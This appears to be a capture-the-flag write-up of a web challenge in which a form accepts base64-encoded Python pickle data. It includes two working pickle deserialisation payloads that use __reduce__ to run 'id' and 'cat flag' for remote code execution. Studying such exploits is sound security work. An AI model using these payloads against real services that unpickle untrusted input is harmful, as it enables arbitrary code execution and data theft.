# Sauerkraut (Web)

This was a web challenege that had text form where we can submit text

<img src="https://i.imgur.com/5CYfcie.png"/>

On entering some text , it gave us an error about "invalid base64"

<img src="https://i.imgur.com/oDbT5nw.png"/>

So after inputtting encoded text we get this 

<img src="https://i.imgur.com/yPef4wk.png"/>

It then showed that "it could not find MARK" , I didn't know what that meant so I just encoded that text

<img src="https://i.imgur.com/bLE5Swn.png"/>

And when I submitted that , it showed me "pickle data was truncated"

<img src="https://i.imgur.com/zB07yni.png"/>

Here I then goolged `pickle` , and found that it's a library or module that allows you to serliaze data , convert them into objects so that it can be passed for different process

<img src="https://i.imgur.com/QB4otDA.png"/>

And this lead me to exploiting to pickle in python , I found a resource where it showed RCE for pickle so this is the PoC that I found 

```python
import base64
import codecs
import pickle

class RCE(object):
    def __reduce__(self):
        import subprocess
        return (subprocess.check_output, (['id'], ) )
class RCEStr(object):
    def __reduce__(self):
        return (codecs.decode, (RCE(), 'utf-8') )

pickle_data = pickle.dumps({'name': RCEStr()})
payload = base64.urlsafe_b64encode(pickle_data)
print(payload.decode('utf-8'))
```

<img src="https://i.imgur.com/59wwxtf.png"/>

<img src="https://i.imgur.com/sTPtoSR.png"/>

Perfect , we have found the we can do remote code execution , all that is left is to find the flag , so I ran `ls` command to see if there's a file we can read

<img src="https://i.imgur.com/bUPduRx.png"/>

```python
import base64
import codecs
import pickle

class RCE(object):
    def __reduce__(self):
        import subprocess
        return (subprocess.check_output, (['cat','flag'], ) )
class RCEStr(object):
    def __reduce__(self):
        return (codecs.decode, (RCE(), 'utf-8') )

pickle_data = pickle.dumps({'name': RCEStr()})
payload = base64.urlsafe_b64encode(pickle_data)
print(payload.decode('utf-8'))
```

<img src="https://i.imgur.com/KOvSXVb.png"/>

## References

- https://davidhamann.de/2020/04/05/exploiting-python-pickle/
- https://medium.com/@jonoans/sans-mixed-discipline-ctf-wx01-283b6795d34a